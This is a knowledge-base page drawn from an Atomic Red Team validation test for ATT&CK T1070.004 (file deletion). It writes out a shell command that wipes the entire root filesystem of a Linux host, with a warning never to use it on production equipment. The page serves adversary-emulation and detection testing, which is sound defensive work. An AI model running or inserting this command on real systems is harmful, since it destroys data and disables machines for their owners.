---
atomic_guid: "f3aa95fe-4f10-4485-ad26-abf22a764c52"
title: "Delete Filesystem - Linux"
framework: "atomic"
generated: "true"
attack_technique_id: "T1070.004"
attack_technique_name: "Indicator Removal on Host: File Deletion"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.yaml"
build_date: "2026-04-26 14:38:39"
executor: "sh"
aliases:
  - "f3aa95fe-4f10-4485-ad26-abf22a764c52"
  - "Delete Filesystem - Linux"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Delete Filesystem - Linux

This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.

## Metadata

- Atomic GUID: f3aa95fe-4f10-4485-ad26-abf22a764c52
- Technique: T1070.004: Indicator Removal on Host: File Deletion
- Platforms: linux
- Executor: sh
- Source Path: atomics/T1070.004/T1070.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1070-indicator_removal|T1070.004]]

## Executor

- name: sh

### Command

```sh
[ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.yaml)
